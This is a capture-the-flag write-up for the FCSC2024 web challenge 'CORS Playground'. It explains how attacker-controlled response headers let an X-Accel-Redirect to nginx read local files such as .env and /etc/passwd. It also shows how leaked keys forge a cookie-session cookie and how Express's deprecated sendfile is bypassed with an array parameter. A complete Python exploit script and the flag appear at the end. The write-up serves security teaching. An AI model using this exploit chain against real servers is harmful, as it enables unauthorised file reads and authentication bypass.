---
source: kevin-mizu
source_url: https://mizu.re/post/cors-playground
title: "CORS Playground | mizu.re"
description: "CORS Playground"
---

_keyboard\_arrow\_up_

title: CORS Playground

date: Apr 13, 2024

tags: [Writeup](https://mizu.re/tag/Writeup) [FCSC2024](https://mizu.re/tag/FCSC2024) [Web](https://mizu.re/tag/Web) [File\_Read](https://mizu.re/tag/File_Read)

# CORS Playground

![](https://mizu.re/articles/writeups/FCSC2024/cors_playground/images/logo-fcsc2024.png)

* * *

Difficulty: 451 points \| 20 solves

Description: Perplexed by CORS?
Our CORS Playground is your ideal solution.
This intuitive and sleek platform lets you effortlessly learn and experiment with CORS policies.
Perfect for unraveling the complexities of secure cross-origin requests.
Dive in and clarify your CORS concepts!

Link: [Hackropole](https://hackropole.fr/fr/challenges/web/fcsc2024-web-cors-playground/).

Author: [Me](https://twitter.com/kevin_mizu)

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/cors-playground#recon)
- [📁 Nginx file read](https://mizu.re/post/cors-playground#nginx-file-read)
- [🍪 Crafting a session cookie](https://mizu.re/post/cors-playground#crafting-a-session-cookie)
- [🚩 Reading the flag](https://mizu.re/post/cors-playground#reading-the-flag)
- [💥 TL/DR: Chain everything together](https://mizu.re/post/cors-playground#chain)

## 🕵️ Recon

This challenge brings a very simple application which aims to play with CORS functionalities.

![frontend.png](https://mizu.re/articles/writeups/FCSC2024/cors_playground/images/frontend.png)

On the backend we can find:

- /src/nginx/nginx.conf

```json
// ...
http {
    server {
        listen 8000;
        server_name _;
        root /;

        location / {
            proxy_pass "http://127.0.0.1:3000/";
        }
    }
}
```

The nginx configuration file is straightforward, mainly directing all requests to the backend via a proxy\_pass. However, a potential concern is the root / directive, which, if try\_files is used, may allow access to any file within the current nginx service's working directory.

- /src/app/app.js

```js
const express = require("express");
const cookieSession = require("cookie-session");
require("dotenv").config();
const app  = express();

app.use(cookieSession({
    name: "session",
    keys: [process.env.KEY1, process.env.KEY2]
}));

app.all("/cors", (req, res) => {
    for (const [key, value] of Object.entries(req.query)) {
        if (key.includes("X-")) delete req.query[key]
    }

    res.set(req.query);
    if (req.session.user === "internal" && !req.query.filename?.includes("/")) {
        res.sendfile(req.query.filename || "app.js");
    } else {
        res.send("Hello World!");
    }
});

app.use(express.static("public"));
app.listen(process.env.PORT, () => {
    console.log(`CORS Playground running on port ${process.env.PORT}`);
});
```

On the application side, functionalities were limited:

- The /cors endpoint enables control over response headers, facilitating CORS management on the front-end.
- Being an internal user allows to read files that doesn't include a /.

Furthermore, the express's session cookie keys where located on a .env file which were different on the remote instance.

- /src/app/.env

```env
PORT=3000
KEY1=FAKE_KEY_1
KEY2=FAKE_KEY_2
```

Finaly, to solve the challenge a flag.txt must be read on the root directory.

- /Dockerfile

```dockerfile
# ...
COPY --chown=root:root --chmod=444 ./src/flag.txt /flag.txt
# ...
```

## 📁 Nginx file read

The first step of this challenge was probably the hardest one to find. From the application source code, we can see that we need to be the internal user to interact with advanced features. This mixed with the fact that X- response headers are blocked indicates that there was something to deal with the nginx.

> What could a proxy\_pass only nginx configuration be abused for?

As indicate by the filter (X-), to find such way to abuse it, we need to take a look to nginx's custom response headers: ( [documentation](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/))

- X-Accel-Redirect: Indicate Nginx to internally redirect a request to a specified location.
- X-Accel-Buffering: Controls whether Nginx should buffer the response or not.
- X-Accel-Charset: Sets the character set for the response when using X-Accel-Redirect.
- X-Accel-Expires: Sets the expiration time for the response when using X-Accel-Redirect.
- X-Accel-Limit-Rate: Limits the rate of transfer for responses when using X-Accel-Redirect.

From all them, there is one used for internal redirect (X-Accel-Redirect). This one is well known in order to access internal only nginx route, therefore a specific behavior isn't well described in the documentation.

Keeping this in mind, if we try to set X-Accel-Redirect: mizu.png (or any random value), we can see the following with the docker logs:

![error_1.png](https://mizu.re/articles/writeups/FCSC2024/cors_playground/images/error_1.png)

As we can see, it informs us that it tries to read the mizu.png file which doesn't exists 👀

> Why is this even possible when no try\_files is present inside the nginx configuration???

Examining the nginx source code reveals the following flow:

- nginx \> src/http/ngx\_http\_upstream.c ( [permalink](https://github.com/nginx/nginx/blob/d8a849ae3c99ee5ca82c9a06074761e937dac6d6/src/http/ngx_http_upstream.c#L461))

```c
ngx_conf_bitmask_t  ngx_http_upstream_ignore_headers_masks[] = {
    { ngx_string("X-Accel-Redirect"), NGX_HTTP_UPSTREAM_IGN_XA_REDIRECT }, // Create a link to the X-Accel-Redirect header
    // ...
}
```

- nginx \> src/http/ngx\_http\_upstream.c ( [permalink](https://github.com/nginx/nginx/blob/d8a849ae3c99ee5ca82c9a06074761e937dac6d6/src/http/ngx_http_upstream.c#L2813C1-L2831C6))

```c
static ngx_int_t
ngx_http_upstream_process_headers(ngx_http_request_t *r, ngx_http_upstream_t *u)
{
    // ...
    if (u->headers_in.x_accel_redirect
        && !(u->conf->ignore_headers & NGX_HTTP_UPSTREAM_IGN_XA_REDIRECT)) // Handle the header
    {
```

- nginx \> src/http/ngx\_http\_upstream.c ( [permalink](https://github.com/nginx/nginx/blob/d8a849ae3c99ee5ca82c9a06074761e937dac6d6/src/http/ngx_http_upstream.c#L2864C1-L2889C6))

```c
uri = u->headers_in.x_accel_redirect->value;

if (uri.data[0] == '@') {
    ngx_http_named_location(r, &uri); // In case of X-Accel-Redirect: @aaaa

} else {
    // ...

    if (r->method != NGX_HTTP_HEAD) {
        r->method = NGX_HTTP_GET;
        r->method_name = ngx_http_core_get_method; // If not HEAD -> transform it to GET
    }

    ngx_http_internal_redirect(r, &uri, &args); // Resolve the header value
}
```

- nginx \> /src/http/ngx\_http\_core\_module.c ( [permalink](https://github.com/nginx/nginx/blob/d8a849ae3c99ee5ca82c9a06074761e937dac6d6/src/http/ngx_http_core_module.c#L2499C1-L2550C2))

```c
ngx_http_internal_redirect(ngx_http_request_t *r,
    ngx_str_t *uri, ngx_str_t *args)
{
    // ...
    ngx_http_handler(r); // Rehandle the HTTP request

    return NGX_DONE;
}
```

As observed, when interpreting the X-Accel-Redirect header, it essentially reprocesses the HTTP request one more time with an updated path.

> What distinguishes the second process?

Indeed, when sending a request to nginx, it's impossible to set a path that doesn't start with a /:

![error_2.png](https://mizu.re/articles/writeups/FCSC2024/cors_playground/images/error_2.png)

However, this is possible with X-Accel-Redirect! Thanks to this feature, it becomes possible to exploit the default nginx resolving behavior. For instance, if we consider an nginx configuration with a / route, it becomes feasible to read /etc/passwd (assuming the root is /) even if no try\_files directive is utilized :)

```conf
server {
    listen       8000;
    server_name  localhost;
    root /;

    location /hello {
        return "Hello World!";
    }
}
```

![etc_passwd.png](https://mizu.re/articles/writeups/FCSC2024/cors_playground/images/etc_passwd.png)

> Which files can be read?

Essentially, the file will be read using the following path: {{WORKING DIRECTORY}}/{{ROOT FOLDER}}{{X-ACCEL-REDIRECT}}. In the context of the challenge, the nginx service has been started from /usr/app, and the root folder is /, which means it will open(x\_accel\_red\_value).

However, there are a few subtleties. In the case of a root directive that isn't /, such as /var/www/html/, it will resolve it like this: /var/www/html{{X-ACCEL-REDIRECT}}. This means that if X-Accel-Redirect: .env is provided, it will attempt to open /var/www/html.env, which doesn't exists.

Hence, if the root is set to /var/www/html and /var/www/html-dev exists, it would be feasible to read a file using X-Accel-Redirect: -dev/index.php.

In the context of the challenge, .env can be retrieved:

![env.png](https://mizu.re/articles/writeups/FCSC2024/cors_playground/images/env.png)

_Note that the X- filter can easily be bypassed by using x- instead._

## 🍪 Crafting a session cookie

Now that we have access to the .env file, we need to craft a session cookie which pass the following condition:

```js
if (req.session.user === "internal" && !req.query.filename?.includes("/")) {
    res.sendfile(req.query.filename || "app.js");
}
```

To do so, it is important to understand how does cookies are generated by cookie-session. Delving into the source code we can find:

- keygrip \> /index.js ( [permalink](https://github.com/crypto-utils/keygrip/blob/70be53a7c8cd2c8e2f30036d2bbb40e911562542/index.js#L21))

```js
function sign(data, key) {
    return crypto
      .createHmac(algorithm, key)
      .update(data).digest(encoding)
      .replace(/\/|\+|=/g, function(x) {
        return ({ "/": "_", "+": "-", "=": "" })[x]
      })
}
```

Translating it to python we get:

```python
cookie_name = "session"
data = dumps({ "user": "internal" }, separators=(",", ":"))
session_cookie = b64encode(data.encode()).decode()
hmac_signature = hmac.new(KEY1.encode(), f"{cookie_name}={session_cookie}".encode(), hashlib.sha1).digest()
sid_cookie = b64encode(hmac_signature).decode().replace("/", "_").replace("+", "-").replace("=", "")
```

## 🚩 Reading the flag

The final step involves reading the flag using the internal user privilege. To accomplish this, we need to examine the following code section:

```js
if (req.session.user === "internal" && !req.query.filename?.includes("/")) {
    res.sendfile(req.query.filename || "app.js");
```

As observed, it uses sendfile instead of sendFile, which is a deprecated Express method. What's the difference? The sendFile method validates the input type, whereas sendfile does not.

- express \> /lib/response.js ( [permalink](https://github.com/expressjs/express/blob/d97d79ed9a25099ec4f0537ad8bf2a9378350a6b/lib/response.js#L420C1-L433C4))

```js
res.sendFile = function sendFile(path, options, callback) {
  // ...
  if (typeof path !== 'string') {
    throw new TypeError('path must be a string to res.sendFile')
  }
```

- express \> /lib/response.js ( [permalink](https://github.com/expressjs/express/blob/d97d79ed9a25099ec4f0537ad8bf2a9378350a6b/lib/response.js#L502C1-L516C36))

```js
res.sendfile = function (path, options, callback) {
  // ...
  var file = send(req, path, opts);
```

With this, it becomes possible to utilize an array object that have the includes method within its prototype to circumvent the check:

![includes.png](https://mizu.re/articles/writeups/FCSC2024/cors_playground/images/includes.png)

## 💥 TL/DR: Chain everything together

- Exploit the response header control to read local files using X-Accel-Redirect: .env.
- Utilize the leaked keys to forge an internal user session.
- Leverage the deprecated sendfile method to access the flag.

```python
from base64 import b64encode
from requests import get
from json import dumps
from re import findall
import hmac, hashlib

# Init
DOMAIN = "https://cors-playground.france-cybersecurity-challenge.fr/"

# Retrieve .env
source = get(f"{DOMAIN}/cors?x-Accel-Redirect=.env").text
KEY1 = findall("KEY1=(.*?)\n", source)[0]
KEY2 = findall("KEY2=(.*)", source)[0]

# https://github.com/crypto-utils/keygrip/blob/70be53a7c8cd2c8e2f30036d2bbb40e911562542/index.js#L21
# default alg: SHA1
# default enc: base64
# data sign -> {{COOKIE-NAME}}={{ENC(DATA)}} -> session=eyJ1c2VyIjoiYWRtaW4ifQ==
cookie_name = "session"
data = dumps({ "user": "internal" }, separators=(",", ":"))
session_cookie = b64encode(data.encode()).decode()
hmac_signature = hmac.new(KEY1.encode(), f"{cookie_name}={session_cookie}".encode(), hashlib.sha1).digest()
sid_cookie = b64encode(hmac_signature).decode().replace("/", "_").replace("+", "-").replace("=", "")

# Get the flag
flag = get(f"{DOMAIN}/cors?filename[]=/flag.txt", cookies={
    cookie_name: session_cookie,
    f"{cookie_name}.sig": sid_cookie
}).text.strip()
print(flag)
```

Running it against the challenge and we get:

**Flag**: FCSC{17747e6e30f378a2fc84f3d6fa93c192e0d3e5dbe670d8913c67c99741e62c5c}

[_keyboard\_arrow\_left_ Pong](https://mizu.re/post/pong)

[Playing with DOMPurify's custom elements handling _keyboard\_arrow\_right_](https://mizu.re/post/playing-with-dompurify-ce-handling)